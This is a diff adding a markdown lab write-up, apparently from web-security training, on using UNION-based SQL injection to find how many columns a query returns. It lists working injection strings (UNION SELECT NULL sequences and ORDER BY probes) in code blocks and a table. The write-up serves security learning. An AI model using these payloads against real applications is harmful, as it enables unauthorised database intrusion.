@@ -168,6 +168,86 @@ Here:
 > ✔️ **Completed** - Successfully bypassed authentication and logged in as administrator.
 ---
 
+
+<h3 align="center">🔍 Lab 3 - Determining Number of Columns via UNION SQL Injection</h3>
+
+<p align="center">
+  <b>Lab: SQL injection UNION attack, determining the number of columns returned by the query</b><br>
+  <i>Target: determine number of columns via SQLi + UNION attack.</i>
+</p>
+
+### 🧠 Lab Context
+
+> This lab contains a SQL injection vulnerability in the product category filter. 
+> The results from the query are returned in the application's response.
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+```
+
+Your goal is to inject a UNION-based payload that matches the column count of the original query.
+
+---
+
+### 🎯 Goal
+
+✅ **Exploit UNION-based SQLi to determine the number of columns in the original query.**
+
+---
+
+### 🛠️ UNION Injection Strategy
+
+The application returns SQL results directly in the HTTP response, allowing you to probe using:
+
+```http
+category='+UNION+SELECT+NULL--
+```
+
+If the number of `NULL` values doesn't match the original columns, it throws an error. You iterate:
+
+```http
+category='+UNION+SELECT+NULL,NULL--
+category='+UNION+SELECT+NULL,NULL,NULL--
+...
+```
+
+Until it works.
+
+This lets you determine how many columns the original query returns.
+
+---
+
+### 🔢 Alternative Strategy: ORDER BY
+
+You can also infer column count using `ORDER BY`:
+
+```http
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+
+When the ORDER BY number exceeds the actual column count, an error will be shown.
+
+---
+
+### 🧪 Payload Testing Table
+
+| Technique        | Payload                            | Description                                      |
+|------------------|------------------------------------|--------------------------------------------------|
+| UNION Null Test  | `'+UNION+SELECT+NULL--` | Initial test for 1 column                        |
+| UNION Null Test  | `'+UNION+SELECT+NULL,NULL--` | Test for 2 columns                               |
+| UNION Null Test  | `'+UNION+SELECT+NULL,NULL,NULL--` | Test for 3 columns (likely success here)         |
+| ORDER BY         | `' ORDER BY 1--` | Orders by column 1                               |
+| ORDER BY         | `' ORDER BY 3--` | If this breaks → original has less than 3 cols   |
+
+---
+
+### ✅ Lab Status
+
+> ✔️ Completed - Null-based UNION injection to identify correct column count.
+
+------
 ### 📚 Learning Takeaways
 
 - SQL comments can terminate rest of a query.
